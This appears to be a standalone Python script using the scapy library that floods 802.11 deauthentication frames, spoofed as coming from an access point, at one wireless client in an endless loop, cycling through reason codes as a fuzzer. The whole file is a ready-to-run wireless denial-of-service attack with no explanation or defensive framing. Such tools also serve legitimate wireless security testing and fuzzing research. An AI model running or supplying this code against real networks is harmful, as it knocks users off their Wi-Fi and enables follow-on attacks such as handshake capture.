#!/usr/bin/python
from scapy.all import *
from random import randint

station='00:11:A0:4F:BE:37'
bssid='00:12:BB:AC:FF:2C'
intfmon='mon0'
verbose=1

while 1:
	for fuzzreason in range(32):
		pkt=Dot11(subtype=12, type=0, addr1=station, addr2=bssid, addr3=bssid)
		pkt/=Dot11Deauth(reason=fuzzreason)
		if verbose: pkt.show()
		sendp(pkt, iface=intfmon, count=10)

